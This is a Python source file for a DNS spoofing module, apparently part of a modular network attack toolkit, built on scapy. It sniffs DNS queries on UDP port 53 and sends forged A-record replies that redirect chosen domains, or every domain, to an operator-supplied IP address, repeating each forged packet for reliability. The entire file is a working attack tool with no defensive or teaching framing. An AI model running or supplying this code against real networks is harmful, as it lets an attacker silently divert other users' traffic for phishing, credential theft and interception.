import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from Network_Modules import network_adapter as iface
from base_module import BaseModule
from message_broker import Message


class DNSModule(BaseModule):
    def __init__(self):
        super().__init__("dns")
        self.is_spoofing = False
        self.target_address = None
        self.domain_spoof_list = None
        self.register_handler("spoof_selected", self.handle_spoof_selected)
        self.register_handler("spoof_all", self.handle_spoof_all)
        self.register_handler("stop", self.handle_stop)

    def on_start(self):
        print(f"[{self.module_name}] DNS module initialized")
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")

    def on_stop(self):
        if self.is_spoofing:
            self.stop_spoofing()

    def hijack_dns_request(self, packet, any_domain=False, domain_target=None):
        try:
            if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
                query_name = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')

                if any_domain or (self.domain_spoof_list and query_name in self.domain_spoof_list):
                    # Build spoofed response
                    spoofed_ip = IP(dst=packet[IP].src, src=packet[IP].dst)
                    spoofed_udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                    spoofed_dns = DNS(
                        id=packet[DNS].id,
                        qr=1,  # Response
                        aa=0,  # Not authoritative
                        rd=packet[DNS].rd,
                        qd=packet[DNS].qd,  # Question section
                        an=DNSRR(
                            rrname=packet[DNSQR].qname,
                            type='A',
                            rclass='IN',
                            ttl=600,
                            rdata=self.target_address
                        )
                    )

                    response = spoofed_ip / spoofed_udp / spoofed_dns

                    # Send multiple times for reliability
                    for _ in range(3):
                        send(response, verbose=0)

                    print(f"[{self.module_name}] Spoofed DNS query for {query_name} -> {self.target_address}")
        except Exception as e:
            print(f"[{self.module_name}] Error in hijack_dns_request: {e}")

    def handle_spoof_selected(self, message: Message):
        self.target_address = message.data.get("target_ip")
        self.domain_spoof_list = message.data.get("spoof_targets")
        self.is_spoofing = True

        print(f"[{self.module_name}] Spoofing selected domains: {self.domain_spoof_list} -> {self.target_address}")
        spoof_thread = threading.Thread(target=self._spoof_selected, daemon=True)
        spoof_thread.start()

        return {"status": "spoofing_selected"}

    def _spoof_selected(self):
        def handle_packet(packet):
            self.hijack_dns_request(packet, any_domain=False)

        try:
            while self.is_spoofing:
                sniff(
                    filter="udp port 53",
                    prn=handle_packet,
                    store=0,
                    stop_filter=lambda pkt: not self.is_spoofing,
                    count=50  # Process in batches
                )
        except Exception as e:
            print(f"[{self.module_name}] Error in spoof selected: {e}")

    def handle_spoof_all(self, message: Message):
        self.target_address = message.data.get("target_ip")
        self.is_spoofing = True

        print(f"[{self.module_name}] Spoofing all DNS queries -> {self.target_address}")
        spoof_thread = threading.Thread(target=self._spoof_all, daemon=True)
        spoof_thread.start()

        return {"status": "spoofing_all"}

    def _spoof_all(self):
        def handle_packet(packet):
            self.hijack_dns_request(packet, any_domain=True)

        try:
            while self.is_spoofing:
                sniff(
                    filter="udp port 53",
                    prn=handle_packet,
                    store=0,
                    stop_filter=lambda pkt: not self.is_spoofing,
                    count=50
                )
        except Exception as e:
            print(f"[{self.module_name}] Error in spoof all: {e}")

    def handle_stop(self, message: Message):
        self.stop_spoofing()
        return {"status": "stopped"}

    def stop_spoofing(self):
        self.is_spoofing = False
        print(f"[{self.module_name}] DNS spoofing stopped.")


# Global instance
_module = None


def get_module() -> DNSModule:
    global _module
    if _module is None:
        _module = DNSModule()
    return _module